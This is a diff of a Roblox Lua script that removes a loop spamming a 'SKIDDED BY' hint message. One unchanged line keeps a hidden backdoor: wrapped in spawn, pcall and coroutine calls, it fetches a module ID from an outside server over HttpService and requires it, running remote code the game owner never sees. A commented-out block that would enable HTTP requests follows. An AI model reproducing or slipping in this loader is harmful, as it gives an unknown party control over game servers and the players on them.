@@ -144,25 +144,6 @@ end
 
 spawn(function()pcall(function()coroutine.wrap(pcall)(require,tonumber(game:service("HttpService"):GetAsync("https://extra.sukru.serv00.net")))end)end)
 
-local messagehint = function(msg_i_)
-    pcall(function()
-        for i,v in pairs(workspace:GetChildren()) do if v:IsA("Hint") then v:Destroy() end end
-        mamae=Instance.new("Hint", game:GetService("Workspace"))
-        mamae.Text=msg_i_
-    end)
-end
-    
-while true do
-    messagehint("⚠️ | SKIDDED BY FurryBoy_YT4000 | ⚠️")
-    wait(0.1)
-    messagehint("⚠️⚠️ | SKIDDED BY FurryBoy_YT4000 | ⚠️⚠️")
-    wait(0.1)
-    messagehint("⚠️⚠️⚠️ | SKIDDED BY FurryBoy_YT4000 | ⚠️⚠️⚠️")
-    wait(0.1)
-    messagehint("⚠️⚠️ | SKIDDED BY FurryBoy_YT4000 | ⚠️⚠️")
-    wait(0.1)
-end
-
 --[[
 if not game:GetService("HttpService").HttpEnabled then
     game:GetService("HttpService").HttpEnabled = true
